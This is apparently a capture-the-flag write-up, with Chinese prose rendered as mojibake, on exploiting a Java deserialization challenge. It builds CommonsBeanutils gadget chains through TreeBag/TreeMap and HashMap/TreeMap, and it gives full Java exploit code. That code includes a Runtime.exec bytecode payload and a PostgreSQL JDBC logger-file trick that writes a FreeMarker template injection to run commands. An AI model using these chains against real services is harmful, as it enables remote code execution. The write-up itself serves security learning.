[é™„ä»¶](../backup/axb.rar)

é“¾å­è°ƒå‡ºæ¥çš„æ—¶å€™å·²ç»å‰©åŠä¸ªå°æ—¶äº†ï¼Œå¡åœ¨æœ€åæ¨¡æ¿æ³¨å…¥ä¸­urlç¼–ç çš„é—®é¢˜ï¼Œæœ€åæ—¶é—´æ¥ä¸åŠäº†ï¼Œå¾ˆå¯æƒœã€‚ğŸ˜­

ç›®æ ‡ç¯å¢ƒé€šè¿‡`iptables`é˜²ç«å¢™è®¾ç½®ä¸å‡ºç½‘

```bash
iptables -F
iptables -X
iptables -Z
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A OUTPUT -m state --state NEW -j DROP
iptables -P OUTPUT DROP
iptables -n -L
```

* æ¸…ç©ºåŸæ¥é…ç½®çš„è§„åˆ™
* æ·»åŠ ä¸€ä¸ªè§„åˆ™åˆ°INPUTé“¾ï¼Œå…è®¸TCPåè®®çš„ç›®æ ‡ç«¯å£ä¸º80å’Œ22çš„æ•°æ®åŒ…é€šè¿‡ã€‚
* æ·»åŠ ä¸€ä¸ªè§„åˆ™åˆ°OUTPUTé“¾ï¼Œå…è®¸ä¸å·²å»ºç«‹çš„è¿æ¥æˆ–ç›¸å…³çš„æ•°æ®åŒ…é€šè¿‡ï¼Œå³å…è®¸å›åº”å¤–éƒ¨è¯·æ±‚çš„æ•°æ®åŒ…é€šè¿‡ã€‚
* æ·»åŠ ä¸€ä¸ªè§„åˆ™åˆ°OUTPUTé“¾ï¼Œæ‹’ç»æ‰€æœ‰æ–°å»ºç«‹çš„è¿æ¥ã€‚
* å°†OUTPUTé“¾çš„é»˜è®¤ç­–ç•¥è®¾ç½®ä¸ºæ‹’ç»ï¼ˆDROPï¼‰

```properties
server.port=80

spring.freemarker.template-loader-path=file:/app/templates/,classpath:/templates/
spring.freemarker.suffix=.ftl
spring.freemarker.cache=false
spring.freemarker.charset=UTF-8
spring.freemarker.expose-request-attributes=true
spring.freemarker.expose-session-attributes=true
spring.freemarker.expose-spring-macro-helpers=true
spring.freemarker.settings.new_builtin_class_resolver=safer
```

freemarkerçš„æ¨¡æ¿è·¯å¾„æœ‰ä¸¤ä¸ªå¯é€‰ï¼š`/app/templates`å’Œç±»è·¯å¾„ä¸‹çš„`templates`ç›®å½•

æ¨¡æ¿ç¼“å­˜å…³äº†ï¼Œè®¾ç½®äº†å®‰å…¨çš„ç±»è§£æå™¨ï¼Œä¸€çœ¼é‰´å®šä¸ºæ¨¡æ¿æ³¨å…¥

è‡ªå®šä¹‰ä¸€ä¸ª`ObjectInputStream`ï¼Œé‡å†™äº†`resolveClass`ï¼Œé»‘åå•å¦‚ä¸‹ï¼š

```java
BLACKLIST.add("com.sun.jndi");
BLACKLIST.add("com.fasterxml.jackson");
BLACKLIST.add("org.springframework");
BLACKLIST.add("com.sun.rowset.JdbcRowSetImpl");
BLACKLIST.add("java.security.SignedObject");
BLACKLIST.add("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
BLACKLIST.add("java.lang.Runtime");
BLACKLIST.add("java.lang.ProcessBuilder");
BLACKLIST.add("java.util.PriorityQueue");
```

ç¯å¢ƒæœ‰ä¸¤ä¸ªé‡è¦ä¾èµ–

`commons-beanutils`å’Œ`postgresql`

CBé“¾å¯ä»¥è°ƒç”¨ä»»æ„getterï¼Œä½†å¸¸ç”¨çš„getteråˆ©ç”¨ç±»`JdbcRowSetImpl`ã€`com.sun.jndi.ldap.LdapAttribute`ï¼ˆJNDIï¼Œä½†ç›®æ ‡ç¯å¢ƒ8u312ä¹Ÿå—é™ï¼‰ã€`TemplatesImpl`ï¼ˆåŠ è½½å­—èŠ‚ç ï¼‰ã€`SignedObject`ï¼ˆäºŒæ¬¡ååºåˆ—åŒ–ï¼‰

ä¹‹å‰çœ‹åˆ°è¿‡ä¸€ç¯‡æ–‡ç« ï¼Œåœ¨JDK17ä¸­åˆ©ç”¨åå°„è®¿é—®JDKå†…éƒ¨ç±»æ—¶ï¼Œä¼šæŠ›å‡º`IllegalAccessException`å¼‚å¸¸ï¼Œè¿™ä¸JDK9å¼•å…¥çš„æ¨¡å—éš”ç¦»æœºåˆ¶æœ‰å…³ã€‚æ–‡ä¸­æåˆ°äº†ç”¨ä¸€äº›JDBCæœ‰å…³çš„ç¬¬ä¸‰æ–¹ä¾èµ–æ¥ä»£æ›¿è¿™äº›å¸¸è§çš„å†…éƒ¨ç±»ï¼Œè°ƒç”¨å…¶`getConnection`ï¼Œæ§åˆ¶è¿æ¥æŒ‡å®šçš„JDBC URLã€‚è”ç³»åˆ°è¿™é¢˜å°±å¾ˆå®¹æ˜“æƒ³åˆ°`postgresql`çš„JDBC Attack

å›é¡¾ä¸€ä¸‹CBé“¾ï¼š

> PriorityQueue#readObject
>
> -> #heapify 
>
> -> #siftDown 
>
> -> #siftDownUsingComparator
>
> -> BeanComparator#compare
>
> -> PropertyUtils#getProperty
>
> -> EvilObject#getter

éœ€è¦è°ƒç”¨åˆ°`BeanComparator#compare`ï¼Œè¿™é¢˜æŠŠCBé“¾çš„å…¥å£ç±»`PriorityQueue`ç¦äº†

ç½‘ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ª`TreeBag+TreeMap`é…åˆæ¥è°ƒç”¨`compare`ï¼Œç”¨æ¥ä»£æ›¿CC2ä¸­çš„`PriorityQueue`

ä½†æ˜¯`TreeBag`æ˜¯`commons collections`é‡Œçš„ç±»ï¼Œåé¢æ‰å‘ç°`commons beanutils`å±…ç„¶å¸¦äº†`commons collections`ï¼ˆå“­æ­»ï¼‰

# TreeBag+TreeMap

Bagæ¥å£ç»§æ‰¿è‡ªCollectionæ¥å£ï¼Œå®šä¹‰äº†ä¸€ä¸ªé›†åˆï¼Œè¯¥é›†åˆä¼šè®°å½•å¯¹è±¡åœ¨é›†åˆä¸­å‡ºç°çš„æ¬¡æ•°ã€‚

> Defines a collection that counts the number of times an object appears in the collection.
> Suppose you have a Bag that contains {a, a, b, c}. Calling getCount(Object) on a would return 2, while calling uniqueSet() would return {a, b, c}.

å®ƒæœ‰ä¸€ä¸ªå­æ¥å£SortedBagï¼Œå®šä¹‰äº†ä¸€ç§å¯ä»¥å¯¹å…¶å”¯ä¸€ä¸é‡å¤æˆå‘˜æ’åºçš„Bagç±»å‹ã€‚

> Defines a type of Bag that maintains a sorted order among its unique representative members.

æ—¢ç„¶ç”¨åˆ°äº†æ’åºï¼Œé‚£å°±å¾ˆæœ‰å¯èƒ½ä¼šè°ƒç”¨åˆ°`compare`ã€‚

çœ‹çœ‹`TreeBag`çš„ç±»ä»‹ç»ï¼š

> Implements SortedBag, using a TreeMap to provide the data storage. This is the standard implementation of a sorted bag.

è¿™ä¸ªç±»çš„æ„é€ å™¨æ¥æ”¶ä¸€ä¸ª`TreeMap`å¯¹è±¡ï¼Œç”¨`TreeMap`æ¥å­˜å‚¨æ’åºçš„æ•°æ®ã€‚

`TreeMap`çš„æ„é€ å™¨æ¥æ”¶ä¸€ä¸ª`Comparator`å¯¹è±¡ï¼Œé€šè¿‡è¿™ä¸ªç»™å®šçš„æ¯”è¾ƒå™¨æ¥æ’åºã€‚

`TreeBag`ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨çˆ¶ç±»çš„`doReadObject`æ¥å¯¹æ•°æ®è¿›è¡Œæ¢å¤ï¼Œå¾€`TreeMap`é‡Œ`put`æ•°æ®ï¼Œ`TreeMap`å­˜å‚¨çš„æ˜¯å¯¹è±¡å’Œå®ƒçš„å‡ºç°æ¬¡æ•°ã€‚

```java
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
    in.defaultReadObject();
    Comparator comp = (Comparator) in.readObject();
    super.doReadObject(new TreeMap(comp), in);
}

protected void doReadObject(Map map, ObjectInputStream in) throws IOException, ClassNotFoundException {
    this.map = map;
    int entrySize = in.readInt();
    for (int i = 0; i < entrySize; i++) {
        Object obj = in.readObject();
        int count = in.readInt();
        map.put(obj, new MutableInteger(count));
        size += count;
    }
}
```

åœ¨å¾€`TreeMap`é‡Œæ”¾æ•°æ®æ—¶å°±ä¼šè¿›è¡Œæ¯”è¾ƒæ¥æ’åºã€‚

```java
public V put(K key, V value) {
    Entry<K,V> t = root;
    if (t == null) {
        compare(key, key); // type (and possibly null) check

        root = new Entry<>(key, value, null);
        size = 1;
        modCount++;
        return null;
    }
    int cmp;
    Entry<K,V> parent;
    Comparator<? super K> cpr = comparator;
    if (cpr != null) {
        do {
            parent = t;
            cmp = cpr.compare(key, t.key);
            if (cmp < 0)
                t = t.left;
            else if (cmp > 0)
                t = t.right;
            else
                return t.setValue(value);
        } while (t != null);
    }
    // ...
}
```

æ„é€ `TreeBag`çš„æ—¶å€™ï¼Œè°ƒç”¨`add`ä¹Ÿä¼šè§¦å‘`map#put`ï¼Œå› æ­¤æˆ‘ä»¬é€šè¿‡åå°„æ¥æ„é€ 

ç®€å•çœ‹çœ‹`TreeMap#put`çš„æºç ï¼Œé¦–å…ˆå®ƒä¼šåˆ¤æ–­æ ¹èŠ‚ç‚¹æ˜¯å¦ä¸ºç©ºï¼Œæœ€åˆæ²¡å¾€é‡Œé¢æ”¾ä¸œè¥¿è‚¯å®šæ˜¯ä¸ºç©ºçš„ã€‚

æ¥ç€ä¸»è¦å˜åŠ¨çš„æœ‰ä¸‰ä¸ªå±æ€§`root`ã€`size`å’Œ`modCount`(`modCount`ä¸æ”¹ä¹Ÿæ²¡äº‹)

æ ¹èŠ‚ç‚¹(`Entry`)çš„`parent`ä¸º`null`

å¦‚æœè¦è®¾ç½®å­èŠ‚ç‚¹ï¼Œå†æ¥ç€è®¾ç½®`left`å’Œ`right`å±æ€§å³å¯

æˆ‘ä»¬è¿™é‡Œåªéœ€è¦è®¾ç½®ä¸€ä¸ªæ ¹èŠ‚ç‚¹å°±å¤Ÿäº†ï¼Œæ ¹èŠ‚ç‚¹æ”¾å…¥`TreeMap`æ—¶ä¼šå¯¹è‡ªèº«çš„`key`è‡ªå·±è·Ÿè‡ªå·±è¿›è¡Œ`compare`

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.bag.TreeBag;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.TreeMap;

public class TreeBagTest {
    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{genPayload("calc")});
        setFieldValue(obj, "_name", "a");
        BeanComparator comparator = new BeanComparator("outputProperties");

        TreeBag bag = new TreeBag();
        TreeMap<Object, Object> map = new TreeMap<>();
        setFieldValue(map, "size", 1);
        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Class<?> mutableInteger = Class.forName("org.apache.commons.collections.bag.AbstractMapBag$MutableInteger");
        Constructor<?> constructor = mutableInteger.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        Object MutableInteger = constructor.newInstance(1);

        Object node = nodeCons.newInstance(obj, MutableInteger, null);
        setFieldValue(map, "root", node);
        setFieldValue(map, "comparator", comparator);
        setFieldValue(bag, "map", map);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(bag);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }

    public static byte[] genPayload(String cmd) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"" + cmd + "\");");
        clazz.addConstructor(constructor);
        clazz.getClassFile().setMajorVersion(49);
        return clazz.toBytecode();
    }

    public static void setFieldValue(Object obj, String fieldName, Object newValue) throws Exception {
        Class clazz = obj.getClass();
        Field field;
        try {
            field = clazz.getDeclaredField(fieldName);
        } catch (NoSuchFieldException e) {
            field = clazz.getSuperclass().getDeclaredField(fieldName);
        }
        field.setAccessible(true);
        field.set(obj, newValue);
    }
}
```

# HashMap+TreeMap

ä¸ç”¨é‚£ä¸ª`TreeBag`ä¹Ÿå¯ä»¥ï¼Œç”¨åŸç”ŸJDKè‡ªå¸¦çš„ã€‚

ä¸æ­¢`TreeMap`çš„`put`ä¼šè°ƒç”¨`compare`ï¼Œå…¶`get`ä¹Ÿä¼šè°ƒç”¨`compare`

```java
public V get(Object key) {
    Entry<K,V> p = getEntry(key);
    return (p==null ? null : p.value);
}

final Entry<K,V> getEntry(Object key) {
    if (comparator != null)
        return getEntryUsingComparator(key);
    // ...
}

final Entry<K,V> getEntryUsingComparator(Object key) {
    K k = (K) key;
    Comparator<? super K> cpr = comparator;
    if (cpr != null) {
        Entry<K,V> p = root;
        while (p != null) {
            int cmp = cpr.compare(k, p.key);
            if (cmp < 0)
                p = p.left;
            else if (cmp > 0)
                p = p.right;
            else
                return p;
        }
    }
    return null;
}
```

é‚£å“ªé‡Œä¼šè°ƒç”¨`Map#get`å‘¢ï¼Œç­”æ¡ˆæ˜¯`AbstractMap.equals`ï¼ˆåˆšå¥½TreeMapæ²¡æœ‰é‡å†™equalsæ–¹æ³•ï¼‰

ä¸ºäº†åˆ¤æ–­ä¸¤ä¸ªMapå¯¹è±¡æ˜¯å¦ç›¸ç­‰ï¼Œé€šè¿‡éå†Map Açš„`entrySet`æ¯ä¸ªé”®å€¼å¯¹ï¼Œæ¯”è¾ƒMap Bå¯¹åº”é”®çš„å€¼ï¼ˆè¿™é‡Œå°±è°ƒç”¨äº†`Map.get(key)`ï¼‰æ˜¯å¦å’ŒMap Açš„ç›¸ç­‰

```java
public boolean equals(Object o) {
    if (o == this)  // è‡ªèº«æ¯”è¾ƒè‚¯å®šç›¸ç­‰
        return true;

    if (!(o instanceof Map))  // ä¸æ˜¯Mapè¿”å›ä¸ç›¸ç­‰
        return false;
    Map<?,?> m = (Map<?,?>) o;
    if (m.size() != size()) // Mapçš„å¤§å°ä¸åŒè‚¯å®šä¸ç›¸ç­‰
        return false;
    try {
        Iterator<Entry<K,V>> i = entrySet().iterator();
        // éå†è‡ªèº«çš„EntrySet
        while (i.hasNext()) {
            Entry<K,V> e = i.next();
            K key = e.getKey();
            V value = e.getValue();
            if (value == null) {
                if (!(m.get(key)==null && m.containsKey(key)))
                    return false;
            } else {
                if (!value.equals(m.get(key)))
                    return false;
            }
        }
    } // ...
}
```

`HashMap#readObject`ä¼šè°ƒç”¨`putVal`ï¼Œ`putVal`å½“é‡åˆ°å“ˆå¸Œç¢°æ’æ—¶å°±ä¼šè°ƒç”¨`equals`

```java
final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
               boolean evict) {
    Node<K,V>[] tab; Node<K,V> p; int n, i;
    if ((tab = table) == null || (n = tab.length) == 0)
        n = (tab = resize()).length;
    if ((p = tab[i = (n - 1) & hash]) == null)  // è¯¥ä½ç½®æœªæ”¾å…ƒç´ ï¼Œæ–°å»ºä¸€ä¸ªNodeæ”¾å…¥
        tab[i] = newNode(hash, key, value, null);
    else { // è¯¥ä½ç½®æœ‰å…ƒç´ ï¼Œå³å“ˆå¸Œç¢°æ’äº†
        Node<K,V> e; K k;
        if (p.hash == hash &&
            ((k = p.key) == key || (key != null && key.equals(k))))
            e = p;
        // ...
    }
}
```

æ„é€ å¦‚ä¸‹ï¼š

```java
TreeMap treeMap1 = makeTree(obj, comparator);
TreeMap treeMap2 = makeTree(obj, comparator);
HashMap hashMap = makeMap(treeMap1, treeMap2);

public static TreeMap<Object, Object> makeTree(Object o, Comparator comparator) throws Exception {
    TreeMap<Object, Object> map = new TreeMap<>();
    setFieldValue(map, "size", 1);
    Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
    Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
    nodeCons.setAccessible(true);

    Object node = nodeCons.newInstance(o, 1, null);
    setFieldValue(map, "root", node);
    setFieldValue(map, "comparator", comparator);

    return map;
}

public static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception {
    HashMap<Object, Object> s = new HashMap<>();
    setFieldValue(s, "size", 2);
    Class<?> nodeC;
    try {
        nodeC = Class.forName("java.util.HashMap$Node");
    } catch (ClassNotFoundException e) {
        nodeC = Class.forName("java.util.HashMap$Entry");
    }
    Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
    nodeCons.setAccessible(true);

    Object tbl = Array.newInstance(nodeC, 2);
    Array.set(tbl, 0, nodeCons.newInstance(0, v1, "b", null));
    Array.set(tbl, 1, nodeCons.newInstance(0, v2, "c", null));
    setFieldValue(s, "table", tbl);
    return s;
}
```

# PostgreSQL JDBC Attack

`org.postgresql.ds.PGSimpleDataSource`ç»§æ‰¿è‡ª`BaseDataSource`ï¼Œå…¶`getConnection()`ä¼šå‘èµ·JDBCè¿æ¥ï¼Œé€šè¿‡è®¾ç½®ä¸€äº›è¿æ¥å‚æ•°æ¥è¿›è¡Œæ”»å‡»ã€‚

* socketFactory/socketFactoryArg

è¿™ä¸¤ä¸ªå‚æ•°ç”¨äºå®ä¾‹åŒ–ä¸€ä¸ªç±»ï¼Œæ„é€ å™¨éœ€è¦æ¥æ”¶ä¸€ä¸ªStringç±»å‹çš„å‚æ•°

ç›´æ¥æƒ³åˆ°springbootä¸‹åŠ è½½XMLæ¥RCEçš„ä¸¤ä¸ªç±»

> org.springframework.context.support.ClassPathXmlApplicationContext
>
> org.springframework.context.support.FileSystemXmlApplicationContext

ä½†ç›®æ ‡ç¯å¢ƒä¸èƒ½å‡ºç½‘ï¼Œå¼ƒä¹‹ã€‚

* loggerLevel/loggerFile

è¿™ä¸¤ä¸ªå‚æ•°ç”¨æ¥å¼€å¯JDBCæ—¥å¿—ï¼Œä¸€ä¸ªç”¨äºæŒ‡å®šæ—¥å¿—è®°å½•ç­‰çº§ï¼Œä¸€ä¸ªç”¨äºæŒ‡å®šæ—¥å¿—æ–‡ä»¶ä½ç½®

æœ¬æ¥æƒ³åˆ©ç”¨è¿™ä¸ªè¦†ç›–`index.ftl`ä¸ºXMLï¼Œå†è®©`ClassPathXmlApplicationContext`å»è¯·æ±‚è¿™ä¸ªXMLï¼Œè¿™æ ·å°±ä¸ç”¨å‡ºç½‘äº†ã€‚ä½†æ˜¯æ—¥å¿—è¿˜ä¼šå¸¦ä¸Šå…¶ä»–ä¿¡æ¯ï¼Œè€Œè¿™ä¸ªç±»è§£æXMLå¯¹æ ¼å¼è¦æ±‚ä¸èƒ½å«æœ‰å…¶ä»–åƒåœ¾å­—ç¬¦ã€‚

æ¨¡æ¿å¼•æ“å°±å…è®¸æ ‡ç­¾ä¹‹å¤–æœ‰å…¶ä»–åƒåœ¾å­—ç¬¦ã€‚

ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœç›´æ¥æŠŠè¦å†™å…¥çš„æ¨¡æ¿æ”¾åˆ°jdbc urlçš„å‚æ•°ä¸­ï¼Œä¼šè¢«urlç¼–ç ï¼Œå¯¼è‡´æ¨¡æ¿è§£æä¸äº†ã€‚

æ”¾åˆ°å…¶ä»–ä½ç½®æ¯”å¦‚ServerNameså°±ä¸ä¼šè¢«urlç¼–ç äº†ã€‚

# EXP

```java
PGSimpleDataSource dataSource = new PGSimpleDataSource();
dataSource.setUrl("jdbc:postgresql://localhost:5432/test?loggerLevel=DEBUG&loggerFile=/app/templates/index.ftl");
String payload = "localhost/?<#assign ac=springMacroRequestContext.webApplicationContext>\n" +
    "<#assign fc=ac.getBean('freeMarkerConfiguration')>\n" +
    "<#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()>\n" +
    "<#assign VOID=fc.setNewBuiltinClassResolver(dcr)>\n" +
    "${\"freemarker.template.utility.Execute\"?new()(\"cat /flag\")}";
dataSource.setServerNames(new String[]{payload});

BeanComparator comparator = new BeanComparator("connection");
TreeMap treeMap1 = makeTree(dataSource, comparator);
TreeMap treeMap2 = makeTree(dataSource, comparator);
HashMap hashMap = makeMap(treeMap1, treeMap2);
ByteArrayOutputStream barr = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(barr);
oos.writeObject(hashMap);
oos.close();
System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));
```

æ¥ç€è®¿é—®`/`æ‹¿åˆ°flag

![image-20231225174403792](./../.gitbook/assets/image-20231225174403792.png)

# Ref

* https://tttang.com/archive/1462/
* https://mogwailabs.de/en/blog/2023/04/look-mama-no-templatesimpl/
* https://mp.weixin.qq.com/s/ClASwg6SH0uij_-IX-GahQ
* https://xz.aliyun.com/t/12143